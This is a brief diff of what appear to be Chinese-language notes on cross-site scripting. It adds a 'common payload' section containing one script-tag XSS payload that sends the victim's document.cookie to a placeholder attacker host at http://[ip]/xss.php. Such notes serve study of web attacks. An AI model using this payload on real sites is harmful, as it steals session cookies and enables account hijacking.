@@ -9,6 +9,9 @@ window.location.href='www.baidu.com'	  用于相当于跳转地址
 
 ````
 
+常用playload：
 
-
+````
+<script>window.location.href='http://[ip]/xss.php?cookie='+document.cookie</script>
+````
      
